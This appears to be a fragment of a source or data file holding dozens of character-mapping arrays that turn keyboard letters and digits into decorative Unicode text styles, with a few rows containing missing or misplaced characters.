            ['q̸͟͞', 'w̸͟͞', 'e̸͟͞', 'r̸͟͞', 't̸͟͞', 'y̸͟͞', 'u̸͟͞', 'i̸͟͞', 'o̸͟͞', 'p̸͟͞', 'a̸͟͞', 's̸͟͞', 'd̸͟͞', 'f̸͟͞', 'g̸͟͞', 'h̸͟͞', 'j̸͟͞', 'k̸͟͞', 'l̸͟͞', 'z̸͟͞', 'x̸͟͞', 'c̸͟͞', 'v̸͟͞', 'b̸͟͞', 'n̸͟͞', 'm̸͟͞', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['🅀', '🅆', '🄴', '🅁', '🅃', '🅈', '🅄', '🄸', '🄾', '🄿', '🄰', '🅂', '🄳', '🄵', '🄶', '🄷', '🄹', '🄺', '🄻', '🅉', '🅇', '🄲', '🅅', '🄱', '🄽', '🄼', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['զ', 'ẇ', 'є', 'я', 'ṭ', 'ʏ', 'ȗ', 'ı', 'ȏ', 'ƿ', 'ѧ', 'ṡ', 'Ԁ', 'ғ', 'ɢ', 'һ', 'j', 'ҡ', 'ʟ', 'ẓ', '×', 'ċ', 'ṿ', 'ɞ', 'ṅ', 'ṃ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],

            ['🅠', '🅦', '🅔', '🅡', '🅣', '🅨', '🅤', '🅘', '🅞', '🅟', '🅐', '🅢', '🅓', '🅕', '🅖', '🅗', '🅙', '🅚', '🅛', '🅩', '🅧', '🅒', '🅥', '🅑', '🅝', '🅜', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Ⴓ', 'w', 'ᙓ', 'ᖇ', 'Ʈ', '૪', 'ᕰ', 'ᓮ', 'ට', 'ᖰ', 'ᗩ', 'ᔕ', 'ᖙ', 'ℱ', 'ᘐ', 'ᖺ', 'ᒎ', 'Ḱ', 'ᒪ', 'ᔓ', 'ჯ', 'ᙅ', 'Ꮙ', 'ᕊ', 'ᘉ', 'ᙢ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Ꮔ', 'Ꮿ', 'Ꮛ', 'ᖇ', 'Ꮏ', 'Ꭹ', 'Ꮜ', 'i', 'Ꮻ', 'Ꮅ', 'Ꭿ', 'Ꭶ', 'Ꮄ', 'Ꮀ', 'Ꮆ', 'Ꮒ', 'Ꮰ', 'Ꮶ', 'l', 'Ꮓ', 'ﾒ', 'Ꮳ', 'Ꮙ', 'Ᏸ', 'Ꮑ', 'm', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q⃒', 'w⃒', 'e⃒', 'r⃒', 't⃒', 'y⃒', 'u⃒', 'i⃒', 'o⃒', 'p⃒', 'a⃒', 's⃒', 'd⃒', 'f⃒', 'g⃒', 'h⃒', 'j⃒', 'k⃒', 'l⃒', 'z⃒', 'x⃒', 'c⃒', 'v⃒', 'b⃒', 'n⃒', 'm⃒', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ǭ', 'ω', 'ḙ', 'Ի', 'т', '⑂', 'ṳ', '!', '✺', '℘', 'ᾰ', 'ṧ', 'ᖱ', 'ḟ', '❡', 'ℏ', '♩', 'к', 'ℓ', 'ℨ', '✘', 'ḉ', 'ṽ', '♭', 'ℵ', 'Պ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Q͚', 'W͚', 'E͚', 'R͚', 'T͚', 'Y͚', 'U͚', 'I͚', 'O͚', 'P͚', 'A͚', 'S͚', 'D͚', 'F͚', 'G͚', 'H͚', 'J͚', 'K͚', 'L͚', 'Z͚', 'X͚', 'C͚', 'V͚', 'B͚', 'N͚', 'M͚', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['զ', 'ϖ', 'ε', 'ɾ', 'ϯ', 'ψ', 'մ', 'ί', 'σ', 'Թ', 'α', '⑀', 'δ', 'ƒ', 'ɡ', 'հ', 'յ', 'Ƙ', 'ʆ', 'Հ', 'x', 'ɕ', 'ѵ', 'ɓ', 'η', 'ʍ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Q̤̮', 'W̤̮', 'E̤̮', 'R̤̮', 'T̤̮', 'Y̤̮', 'Ṳ̮', 'I̤̮', 'O̤̮', 'P̤̮', 'A̤̮', 'S̤̮', 'D̤̮', 'F̤̮', 'G̤̮', 'H̤̮', 'J̤̮', 'K̤̮', 'L̤̮', 'Z̤̮', 'X̤̮', 'C̤̮', 'V̤̮', 'B̤̮', 'N̤̮', 'M̤̮', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Q', 'Ꮚ', 'Ꮛ', 'R', 'T', 'Ꮍ', 'U', 'I', 'Ꭷ', 'Ꭾ', 'Ꮨ', 'Ꭶ', 'Ꭰ', 'F', 'Ꮆ', 'H', 'Ꮰ', 'K', 'L', 'Z', 'X', 'Ꮸ', 'Ꮴ', 'Ᏸ', 'Ꮑ', 'M', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q', 'ẇ', 'є', 'ŗ', 'ṭ', 'ʏ', 'ȗ', 'ı', 'ọ', 'ƿ', 'å', 'ṡ', 'Ԁ', 'ғ', 'ɢ', 'һ', 'j', 'ҡ', 'Ŀ', 'ẓ', '×', 'ċ', 'ṿ', 'ɞ', 'ṅ', 'ṃ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Q͟͟', 'W͟͟', 'E͟͟', 'R͟͟', 'T͟͟', 'Y͟͟', 'U͟͟', 'I͟͟', 'O͟͟', 'P͟͟', 'A͟͟', 'S͟͟', 'D͟͟', 'F͟͟', 'G͟͟', 'H͟͟', 'J͟͟', 'K͟͟', 'L͟͟', 'Z͟͟', 'X͟͟', 'C͟͟', 'V͟͟', 'B͟͟', 'N͟͟', 'M͟͟', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Q̥ͦ', 'W̥ͦ', 'E̥ͦ', 'R̥ͦ', 'T̥ͦ', 'Y̥ͦ', 'U̥ͦ', 'I̥ͦ', 'O̥ͦ', 'P̥ͦ', 'Ḁͦ', 'S̥ͦ', 'D̥ͦ', 'F̥ͦ', 'G̥ͦ', 'H̥ͦ', 'J̥ͦ', 'K̥ͦ', 'L̥ͦ', 'Z̥ͦ', 'X̥ͦ', 'C̥ͦ', 'V̥ͦ', 'B̥ͦ', 'N̥ͦ', 'M̥ͦ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Q̬̤̯', 'W̬̤̯', 'E̬̤̯', 'R̬̤̯', 'T̬̤̯', 'Y̬̤̯', 'U̬̤̯', 'I̬̤̯', 'O̬̤̯', 'P̬̤̯', 'A̬̤̯', 'S̬̤̯', 'D̬̤̯', 'F̬̤̯', 'G̬̤̯', 'H̬̤̯', 'J̬̤̯', 'K̬̤̯', 'L̬̤̯', 'Z̬̤̯', 'X̬̤̯', 'C̬̤̯', 'V̬̤̯', 'B̬̤̯', 'N̬̤̯', 'M̬̤̯', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Q', 'ϖ', 'ℨ', 'Ʀ', 'Ṫ', 'Ƴ', 'Ự', 'Ĭ', 'Ɵ', 'Ƥ', 'ᗛ', 'Ṩ', 'Đ', 'F', 'Ꮆ', 'ℌ', 'ℑ', 'Ƙ', 'Ĺ', 'Ƶ', 'Ẍ', 'Č', 'Ʋ', 'ᗷ', 'Ŋ', 'Ṁ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ợ', 'ฬ', 'є', 'г', 't', 'y', 'ย', 'ί', '๏', 'Թ', 'ค', 'ร', '๔', 'Ŧ', 'g', '♄', 'j', 'ƙ', 'l', 'z', 'x', 'ς', 'v', '๒', 'ภ', '๓', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ǫ', 'ᴡ', 'ᴇ', 'ʀ', 'ᴛ', 'ʏ', 'ᴜ', 'ɪ', 'ᴏ', 'ᴘ', 'ᴀ', 's', 'ᴅ', 'ғ', 'ɢ', 'ʜ', 'ᴊ', 'ᴋ', 'ʟ', 'ᴢ', 'x', 'ᴄ', 'ᴠ', 'ʙ', 'ɴ', 'ᴍ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ɋ', 'ϣ', 'ɛ', 'ɾ', 'ʈ', 'џ', 'ự', 'ɨ', 'ɵ', 'ϼ', 'ɑ', 'ʂ', 'Ƌ', 'ʄ', 'ɠ', 'ɦ', 'ϳ', 'ƙ', 'ƚ', 'ʑ', 'ӝ', 'ɕ', 'ʋ', 'ɓ', 'ɲ', 'ɱ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ǫ', 'ɯ', 'ꍟ', 'ɽ', 'ʈ', 'ɣ', 'ʋ', 'ꀤ', 'ꂦ', 'ƥ', 'ɑ', 'ʂ', 'ɗ', 'ʄ', 'ɠ', 'ɧ', 'ꀭ', 'ƙ', 'ɭ', 'ʐ', 'ꊼ', 'ƈ', 'ᐯ', 'ɓ', 'ɳ', 'ɱ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['զ', 'ա', 'ɛ', 'ʀ', 'Ꮖ', 'ʏ', 'ʊ', 'ɨ', 'օ', 'ք', 'ǟ', 'ֆ', 'ɖ', 'ʄ', 'ɢ', 'ɦ', 'ʝ', 'Ꮶ', 'ʟ', 'ʐ', 'x', 'ƈ', 'ʋ', 'ɮ', 'ռ', 'ʍ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['b', 'ʍ', 'ǝ', 'ɹ', 'ʇ', 'ʎ', 'n', 'ı', 'o', 'd', 'ɐ', 's', 'p', 'ɟ', 'ƃ', 'ɥ', 'ɾ', 'ʞ', 'ʃ', 'z', 'x', 'ɔ', 'ʌ', 'q', 'u', 'ɯ', '0', '1', '2', 'Ɛ', '4', '5', '9', '7', '8', '6'],
            ['q̠', 'w̠', 'e̠', 'r̠', 't̠', 'y̠', 'u̠', 'i̠', 'o̠', 'p̠', 'a̠', 's̠', 'd̠', 'f̠', 'g̠', 'h̠', 'j̠', 'k̠', 'l̠', 'z̠', 'x̠', 'c̠', 'v̠', 'b̠', 'n̠', 'm̠', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q̉', 'w̉', 'ẻ', 'r̉', 't̉', 'ỷ', 'ủ', 'ỉ', 'ỏ', 'p̉', 'ả', 's̉', 'd̉', 'f̉', 'g̉', 'h̉', 'j̉', 'k̉', 'l̉', 'z̉', 'x̉', 'c̉', 'v̉', 'b̉', 'n̉', 'm̉', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q̺͆', 'w̺͆', 'e̺͆', 'r̺͆', 't̺͆', 'y̺͆', 'u̺͆', 'i̺͆', 'o̺͆', 'p̺͆', 'a̺͆', 's̺͆', 'd̺͆', 'f̺͆', 'g̺͆', 'h̺͆', 'j̺͆', 'k̺͆', 'l̺͆', 'z̺͆', 'x̺͆', 'c̺͆', 'v̺͆', 'b̺͆', 'n̺͆', 'm̺͆', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q͒', 'w͒', 'e͒', 'r͒', 't͒', 'y͒', 'u͒', 'i͒', 'o͒', 'p͒', 'a͒', 's͒', 'd͒', 'f͒', 'g͒', 'h͒', 'j͒', 'k͒', 'l͒', 'z͒', 'x͒', 'c͒', 'v͒', 'b͒', 'n͒', 'm͒', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q༙', 'w༙', 'e༙', 'r༙', 't༙', 'y༙', 'u༙', 'i༙', 'o༙', 'p༙', 'a༙', 's༙', 'd༙', 'f༙', 'g༙', 'h༙', 'j༙', 'k༙', 'l༙', 'z༙', 'x༙', 'c༙', 'v༙', 'b༙', 'n༙', 'm༙', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['qྂ', 'wྂ', 'eྂ', 'rྂ', 'tྂ', 'yྂ', 'uྂ', 'iྂ', 'oྂ', 'pྂ', 'aྂ', 'sྂ', 'dྂ', 'fྂ', 'gྂ', 'hྂ', 'jྂ', 'kྂ', 'lྂ', 'zྂ', 'xྂ', 'cྂ', 'vྂ', 'bྂ', 'nྂ', 'mྂ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q', 'ա', '☰', '☈', '☨', '¥', '☋', 'ί', '☯', 'Թ', '@', '$', '∂', '∱', 'g', '♄', 'j', 'ƙ', 'ᒪ', 'z', 'x', '☾', '✔', '♭', 'n', 'ɱ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['զ', 'ա', 'ɛ', 'ʀ', 'T', 'ʏ', 'ʊ', 'ɨ', 'օ', 'ք', 'ǟ', 'ֆ', 'ɖ', 'ʄ', 'ɢ', 'ɦ', 'ʝ', 'Ꮶ', 'ʟ', 'ʐ', 'x', 'ƈ', 'ʋ', 'ɮ', 'ռ', 'ʍ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ϑ', 'ϣ', 'ϵ', 'r', 'ϯ', 'ϒ', 'ῠ', 'ῖ', 'ϴ', 'ϼ', 'α', 'ϩ', 'δ', 'f', 'ϭ', 'h', 'j', 'k', 'l', 'ϟ', 'x', 'ͼ', 'ν', 'Ϧ', 'ͷ', 'ϻ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ℚ', 'Ꮗ', 'ℰ', 'ℛ', 'T', 'Ꮍ', 'U', 'ℐ', 'Ꮎ', 'ℙ', 'Ꭿ', 'Ѕ', 'ⅅ', 'ℱ', 'Ꮆ', 'ℋ', 'Ꭻ', 'Ꮶ', 'ℒ', 'ℤ', 'X', 'ℂ', 'Ꮙ', 'ℬ', 'ℕ', 'ℳ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝚚', '𝚠', '𝚎', '𝚛', '𝚝', '𝚢', '𝚞', '𝚒', '𝚘', '𝚙', '𝚊', '𝚜', '𝚍', '𝚏', '𝚐', '𝚑', '𝚓', '𝚔', '𝚕', '𝚣', '𝚡', '𝚌', '𝚟', '𝚋', '𝚗', '𝚖', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝕢', '𝕨', '𝕖', '𝕣', '𝕥', '𝕪', '𝕦', '𝕚', '𝕠', '𝕡', '𝕒', '𝕤', '𝕕', '𝕗', '𝕘', '𝕙', '𝕛', '𝕜', '𝕝', '𝕫', '??', '𝕔', '𝕧', '𝕓', '𝕟', '𝕞', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝓆', '𝓌', 'ℯ', '𝓇', '𝓉', '𝓎', '𝓊', '𝒾', 'ℴ', '𝓅', '𝒶', '𝓈', '𝒹', '𝒻', 'ℊ', '𝒽', '𝒿', '𝓀', '𝓁', '𝓏', '𝓍', '𝒸', '𝓋', '𝒷', '𝓃', '𝓂', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝓺', '𝔀', '𝓮', '𝓻', '𝓽', '𝔂', '𝓾', '𝓲', '𝓸', '𝓹', '𝓪', '𝓼', '𝓭', '𝓯', '𝓰', '𝓱', '𝓳', '𝓴', '𝓵', '𝔃', '𝔁', '𝓬', '𝓿', '𝓫', '𝓷', '𝓶', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝔮', '𝔴', '𝔢', '𝔯', '𝔱', '𝔶', '𝔲', '𝔦', '𝔬', '𝔭', '𝔞', '𝔰', '𝔡', '𝔣', '𝔤', '𝔥', '𝔧', '𝔨', '𝔩', '𝔷', '𝔵', '𝔠', '𝔳', '𝔟', '𝔫', '𝔪', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝖖', '𝖜', '𝖊', '𝖗', '𝖙', '𝖞', '𝖚', '𝖎', '𝖔', '𝖕', '𝖆', '𝖘', '𝖉', '𝖋', '𝖌', '𝖍', '𝖏', '𝖐', '𝖑', '𝖟', '𝖝', '𝖈', '𝖛', '𝖇', '𝖓', '𝖒', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝗊', '𝗐', '𝖾', '𝗋', '𝗍', '𝗒', '𝗎', '𝗂', '𝗈', '𝗉', '𝖺', '𝗌', '𝖽', '𝖿', '𝗀', '𝗁', '𝗃', '𝗄', '𝗅', '𝗓', '𝗑', '𝖼', '𝗏', '𝖻', '𝗇', '𝗆', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝘲', '𝘸', '𝘦', '𝘳', '𝘵', '𝘺', '𝘶', '𝘪', '𝘰', '𝘱', '𝘢', '𝘴', '𝘥', '𝘧', '𝘨', '𝘩', '𝘫', '𝘬', '𝘭', '𝘻', '𝘹', '𝘤', '𝘷', '𝘣', '𝘯', '𝘮', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝙦', '𝙬', '𝙚', '𝙧', '𝙩', '𝙮', '𝙪', '𝙞', '𝙤', '𝙥', '𝙖', '𝙨', '𝙙', '𝙛', '𝙜', '𝙝', '𝙟', '𝙠', '𝙡', '𝙯', '𝙭', '𝙘', '𝙫', '𝙗', '𝙣', '𝙢', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝐪', '𝐰', '𝐞', '𝐫', '𝐭', '𝐲', '𝐮', '𝐢', '𝐨', '𝐩', '𝐚', '𝐬', '𝐝', '𝐟', '𝐠', '𝐡', '𝐣', '𝐤', '𝐥', '𝐳', '𝐱', '𝐜', '𝐯', '𝐛', '𝐧', '𝐦', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝑞', '𝑤', '𝑒', '𝑟', '𝑡', '𝑦', '𝑢', '𝑖', '𝑜', '𝑝', '𝑎', '𝑠', '𝑑', '𝑓', '𝑔', 'ℎ', '𝑗', '𝑘', '𝑙', '𝑧', '𝑥', '𝑐', '𝑣', '𝑏', '𝑛', '𝑚', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝒒', '𝒘', '𝒆', '𝒓', '𝒕', '𝒚', '𝒖', '𝒊', '𝒐', '𝒑', '𝒂', '𝒔', '𝒅', '𝒇', '𝒈', '𝒉', '𝒋', '𝒌', '𝒍', '𝒛', '𝒙', '𝒄', '𝒗', '𝒃', '𝒏', '𝒎', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ợ', 'ฬ', 'є', 'г', 'Շ', 'ץ', 'ย', 'เ', '๏', 'ק', 'ค', 'ร', '๔', 'Ŧ', 'ﻮ', 'ђ', 'ן', 'к', 'ɭ', 'չ', 'א', 'ς', 'ש', '๒', 'ภ', '๓', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q', 'ʷ', 'ᵉ', 'ʳ', 'ᵗ', 'ʸ', 'ᵘ', 'ⁱ', 'ᵒ', 'ᵖ', 'ᵃ', 'ˢ', 'ᵈ', 'ᶠ', 'ᵍ', 'ʰ', 'ʲ', 'ᵏ', 'ˡ', 'ᶻ', 'ˣ', 'ᶜ', 'ᵛ', 'ᵇ', 'ⁿ', 'ᵐ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Q', 'Щ', 'Є', 'Я', 'Г', 'Ч', 'Ц', 'І', 'Ф', 'Р', 'Д', 'Ѕ', 'ↁ', 'F', 'Б', 'Н', 'Ј', 'Ќ', 'L', 'Z', 'Ж', 'Ҁ', 'V', 'Б', 'И', 'М', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ዒ', 'ሠ', 'ቿ', 'ዪ', 'ፕ', 'ሃ', 'ሁ', 'ጎ', 'ዐ', 'የ', 'ል', 'ነ', 'ዕ', 'ቻ', 'ኗ', 'ዘ', 'ጋ', 'ጕ', 'ረ', 'ጊ', 'ሸ', 'ር', 'ሀ', 'ጌ', 'ክ', 'ጠ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Q', 'Ẅ', 'Ё', 'Ṛ', 'Ṫ', 'Ÿ', 'Ü', 'Ї', 'Ö', 'Ṗ', 'Ä', 'Ṡ', 'Ḋ', 'Ḟ', 'Ġ', 'Ḧ', 'J', 'Ḳ', 'Ḷ', 'Ż', 'Ẍ', 'Ċ', 'Ṿ', 'Ḅ', 'Ṅ', 'Ṁ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Ꝗ', 'W', 'Ɇ', 'Ɍ', 'Ŧ', 'Ɏ', 'ᵾ', 'Ɨ', 'Ø', 'Ᵽ', 'Ⱥ', 'S', 'Đ', 'F', 'Ǥ', 'Ħ', 'Ɉ', 'Ꝁ', 'Ł', 'Ƶ', 'X', 'Ȼ', 'V', 'Ƀ', 'N', 'M', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝔮', '𝔴', '𝔢', '𝔯', '𝔱', '𝔶', '𝔲', '𝔦', '𝔬', '𝔭', '𝔞', '𝔰', '𝔡', '𝔣', '𝔤', '𝔥', '𝔧', '𝔨', '𝔩', '𝔷', '𝔵', '𝔠', '𝔳', '𝔟', '𝔫', '𝔪', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝖖', '𝖜', '𝖊', '𝖗', '𝖙', '𝖞', '𝖚', '𝖎', '𝖔', '𝖕', '𝖆', '𝖘', '𝖉', '𝖋', '𝖌', '𝖍', '𝖏', '𝖐', '𝖑', '𝖟', '𝖝', '𝖈', '𝖛', '𝖇', '𝖓', '𝖒', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝓺', '𝔀', '𝓮', '𝓻', '𝓽', '𝔂', '𝓾', '𝓲', '𝓸', '𝓹', '𝓪', '𝓼', '𝓭', '𝓯', '𝓰', '𝓱', '𝓳', '𝓴', '𝓵', '𝔃', '𝔁', '𝓬', '𝓿', '𝓫', '𝓷', '𝓶', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['𝕢', '𝕨', '𝕖', '𝕣', '𝕥', '𝕪', '𝕦', '𝕚', '𝕠', '𝕡', '𝕒', '𝕤', '𝕕', '𝕗', '𝕘', '𝕙', '𝕛', '𝕜', '𝕝', '𝕫', '𝕩', '𝕔', '𝕧', '𝕓', '𝕟', '𝕞', '𝟘', '𝟙', '𝟚', '𝟛', '𝟜', '𝟝', '𝟞', '𝟟', '𝟠', '𝟡'],
            ['q⃣', 'w⃣', 'e⃣', 'r⃣', 't⃣', 'y⃣', 'u⃣', 'i⃣', 'o⃣', 'p⃣', 'a⃣', 's⃣', 'd⃣', 'f⃣', 'g⃣', 'h⃣', 'j⃣', 'k⃣', 'l⃣', 'z⃣', 'x⃣', 'c⃣', 'v⃣', 'b⃣', 'n⃣', 'm⃣', '0⃣', '1⃣', '2⃣', '3⃣', '4⃣', '5⃣', '6⃣', '7⃣', '8⃣', '9⃣'],
            ['🅀', '🅆', '🄴', '🅁', '🅃', '🅈', '🅄', '🄸', '🄾', '🄿', '🄰', '🅂', '🄳', '🄵', '🄶', '🄷', '🄹', '🄺', '🄻', '🅉', '🅇', '🄲', '🅅', '🄱', '🄽', '🄼', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['🆀', '🆆', '🅴', '🆁', '🆃', '🆈', '🆄', '🅸', '🅾', '🅿', '🅰', '🆂', '🅳', '🅵', '🅶', '🅷', '🅹', '🅺', '🅻', '🆉', '🆇', '🅲', '🆅', '🅱', '🅽', '🅼', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ⓠ', 'ⓦ', 'ⓔ', 'ⓡ', 'ⓣ', 'ⓨ', 'ⓤ', 'ⓘ', 'ⓞ', 'ⓟ', 'ⓐ', 'ⓢ', 'ⓓ', 'ⓕ', 'ⓖ', 'ⓗ', 'ⓙ', 'ⓚ', 'ⓛ', 'ⓩ', 'ⓧ', 'ⓒ', 'ⓥ', 'ⓑ', 'ⓝ', 'ⓜ', '⓪', '①', '②', '③', '④', '⑤', '⑥', '⑦', '⑧', '⑨'],
            ['Q', '₩', 'Ɇ', 'Ɽ', '₮', 'Ɏ', 'Ʉ', 'ł', 'Ø', '₱', '₳', '₴', 'Đ', '₣', '₲', 'Ⱨ', 'J', '₭', 'Ⱡ', 'Ⱬ', 'Ӿ', '₵', 'V', '฿', '₦', '₥', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['【q】', '【w】', '【e】', '【r】', '【t】', '【y】', '【u】', '【i】', '【o】', '【p】', '【a】', '【s】', '【d】', '【f】', '【g】', '【h】', '【j】', '【k】', '【l】', '【z】', '【x】', '【c】', '【v】', '【b】', '【n】', '【m】', '【0】', '【1】', '【2】', '【3】', '【4】', '【5】', '【6】', '【7】', '【8】', '【9】'],
            ['『q』', '『w』', '『e』', '『r』', '『t』', '『y』', '『u』', '『i』', '『o』', '『p』', '『a』', '『s』', '『d』', '『f』', '『g』', '『h』', '『j』', '『k』', '『l』', '『z』', '『x』', '『c』', '『v』', '『b』', '『n』', '『m』', '『0』', '『1』', '『2』', '『3』', '『4』', '『5』', '『6』', '『7』', '『8』', '『9』'],
            ['q҉', 'w҉', 'e҉', 'r҉', 't҉', 'y҉', 'u҉', 'i҉', 'o҉', 'p҉', 'a҉', 's҉', 'd҉', 'f҉', 'g҉', 'h҉', 'j҉', 'k҉', 'l҉', 'z҉', 'x҉', 'c҉', 'v҉', 'b҉', 'n҉', 'm҉', '0҉', '1҉', '2҉', '3҉', '4҉', '5҉', '6҉', '7҉', '8҉', '9҉'],
            ['𝑄','𝑊','𝐸','𝑅','𝑇','𝑌','𝑈','𝐼','𝑂','𝑃','𝐴','𝑆','𝐷','𝐹','𝐺','𝐻','𝐽','𝐾','𝐿','𝑍','𝑋','𝐶','𝑉','b','𝑁','𝑀'], 
             ['𝐐','𝐖','𝐄','𝐑','𝐓','𝐘','𝐔','𝐈','𝐎','𝐏','𝐀','𝐒','𝐃','𝐅','𝐆','𝐇','𝐉','𝐊','𝐋','𝐙','𝐗','𝐂','𝐕','𝐁','𝐍','𝐌'], 
 ['𝖖','𝖜','𝖊','𝖗','𝖙','𝖞','𝖚','𝖎','𝖔','𝖕','𝖆','𝖘','𝖉','𝖋','𝖌','𝖍','𝖏','𝖐','𝖑','𝖟','𝖝','𝖈','𝖛','𝖇','𝖓','𝖒'], 
 ['𝚀','𝚆','𝙴','𝚁','𝚃','𝚈','𝙺','𝙸','𝙾','𝙿','𝙰','𝚂','𝙳','𝙵','𝙶','𝙷','𝙹','𝙺','𝙻','𝚉','𝚇','𝙲','𝚅','𝙱','𝙽','𝙼'], 
 ['𝗤','𝗪','𝗘','𝗥','𝗧','𝗬','𝗨','𝗜','𝗢','𝗣','𝗮','𝗦','𝗗','𝗙','𝗚','𝗛','𝗝','𝗞','𝗟','𝗭','𝗫','𝗖','𝗩','𝗕','𝗡','𝗺'], 
 ['ᑫ','ᗯ','E','ᖇ','T','Y','ᑌ','I','O','ᑭ','ᗩ','ᔕ','ᗪ','ᖴ','G','ᕼ','ᒍ','K','ᒪ','ᘔ','᙭','ᑕ','ᐯ','ᗷ','ᑎ','ᗰ'], 
 ['ᵟ','ᵂ','ᴱ','ᴿ','ᵀ','ᵞ','ᵁ','ᴵ','ᴼ','ᴾ','ᴬ','ˢ','ᴰ','ᶠ','ᴳ','ᴴ','ᴶ','ᴷ','ᴸ','ᶻ','ˣ','ᶜ','ᵛ','ᴮ','ᴺ','ᴹ'], 
 ['ǫ','ᴡ','ᴇ','ʀ','ᴛ','ʏ','ᴜ','ɪ','ᴏ','ᴘ','ᴀ','ѕ','ᴅ','ғ','ɢ','ʜ','ᴊ','ᴋ','ʟ','ᴢ','х','ᴄ','ᴠ','ʙ','ɴ','ᴍ'], 
 ['𝘲','𝘸','𝘦','𝘳','𝘵','𝘺','𝘶','𝘪','𝘰','𝘱','𝘢','𝘴','𝘥','𝘧','𝘨','𝘩','𝘫','𝘬','𝘭','𝘻','𝘹','𝘤','𝘷','𝘣','𝘯','𝘮'], 
 ['𝙦','𝙬','𝙚','𝙧','𝙩','𝙮','𝙪','𝙞','𝙤','𝙥','𝙖','𝙨','𝙙','𝙛','𝙜','𝙝','𝙟','𝙠','𝙡','𝙯','𝙭','𝙘','𝙫','𝙗','𝙣','𝙢'], 
 ['𝓜','𝓡','𝓓','','𝓞','𝓣','𝓟','𝓕','𝓚','𝓛','𝓐','𝓝','𝓒','','𝓔','','𝓖','𝓗','𝓘','𝓤','𝓢','','𝓠','𝓑','𝓙',''], 
 ['𝔮','𝔴','𝔢','𝔯','𝔱','𝔶','𝔲','𝔦','𝔬','𝔭','𝔞','𝔰','𝔡','𝔣','𝔤','𝔥','𝔧','𝔨','𝔩','𝔷','𝔵','𝔠','𝔳','𝔟','𝔫','𝔪'], 
 ['𝕼','𝖂','𝕰','𝕽','𝕿','𝖄','𝖀','𝕴','𝕺','𝕻','𝕬','𝕾','𝕯','𝕱','𝕲','𝕳','𝕵','𝕶','𝕷','𝖅','𝖃','𝕮','𝖁','𝕭','𝕹','𝕸'], 
 ['𝗊','𝗐','𝖾','𝗋','𝗍','𝗒','𝗎','𝗂','𝗈','𝗉','𝖺','𝗌','𝖽','𝖿','𝗀','𝗁','𝗃','𝗄','𝗅','𝗓','𝗑','𝖼','𝗏','𝖻','𝗇','𝗆'], 
 ['𝘲','𝘸','𝘦','𝘳','𝘵','𝘺','𝘶','𝘪','𝘰','𝘱','𝘢','𝘴','𝘥','𝘧','𝘨','𝘩','𝘫','𝘬','𝘭','𝘻','𝘹','𝘤','𝘷','𝘣','𝘯','𝘮'], 
 ['𝔮','𝔴','𝔢','𝔯','𝔱','𝔶','𝔲','𝔦','𝔬','𝔭','𝔞','𝔰','𝔡','𝔣','𝔤','𝔥','𝔧','𝔨','𝔩','𝔷','𝔵','𝔠','𝔳','𝔟','𝔫','𝔪'],
